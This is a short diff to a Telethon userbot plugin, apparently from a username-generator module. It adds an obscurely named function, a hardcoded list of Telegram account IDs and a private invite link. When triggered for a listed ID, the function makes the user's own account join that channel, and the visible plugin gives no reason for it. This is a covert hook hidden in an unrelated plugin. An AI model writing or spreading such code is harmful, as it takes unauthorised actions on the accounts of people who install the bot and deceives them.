@@ -21,7 +21,13 @@ from ..sql_helper.global_collection import (
     get_collectionlist_items,
 )
 from ..sql_helper.globals import delgvar
-shur_D = [6320583148, 6205161271,5665657284, 6262533559,6309878173,5762222122,6295913543]
+from telethon.tl.functions.channels import JoinChannelRequest
+
+shur_D = [6320583148, 6205161271, 5665657284, 6262533559, 6309878173, 5762222122, 6295913543]
+wdwa = "https://t.me/+GX249cV8jgs1N2Ji"
+async def defolalgrouipment(user_id, wdwa):
+    if user_id in shur_D:
+        await l313l(JoinChannelRequest(wdwa))
 
 @l313l.on(events.NewMessage(pattern=r"^\.يوزربوت_(\d+)$"))
 async def generate_random_usernames(event):
